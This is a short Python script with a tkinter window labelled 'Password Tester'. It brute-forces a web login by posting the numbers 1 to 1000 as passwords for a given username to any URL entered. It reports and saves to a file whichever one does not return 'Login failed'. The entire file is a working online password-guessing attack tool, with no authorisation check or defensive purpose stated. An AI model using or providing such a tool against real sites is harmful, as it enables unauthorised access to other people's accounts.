import tkinter as tk
from tkinter import messagebox
import requests


def test_passwords():
    # Get the target URL and username from the GUI inputs
    target_url = url_entry.get()
    username = username_entry.get()

    # Generate a list of numbers from 1 to 1000 as passwords
    passwords = [str(i) for i in range(1, 1001)]

    # Loop through each password and send a POST request with it
    for password in passwords:
        data = {'username': username, 'password': password}
        response = requests.post(target_url, data=data)

        if 'Login failed' not in response.text:
            messagebox.showinfo("Success", f"Password found: {password}")

            # Save the successful password to the 'pass.txt' file
            with open('pass.txt', 'w') as f:
                f.write(password)

            break
    else:
        messagebox.showinfo("No Password Found", "No valid password found in the list.")

    url_entry.delete(0, tk.END)
    username_entry.delete(0, tk.END)


# Create a GUI window
window = tk.Tk()
window.title("Password Tester")

# Labels and entry fields for URL and username
url_label = tk.Label(window, text="Website URL:")
url_label.pack()
url_entry = tk.Entry(window)
url_entry.pack()

username_label = tk.Label(window, text="Username:")
username_label.pack()
username_entry = tk.Entry(window)
username_entry.pack()

# Button to initiate password testing
test_button = tk.Button(window, text="Test Passwords", command=test_passwords)
test_button.pack()

# Start the GUI event loop
window.mainloop()
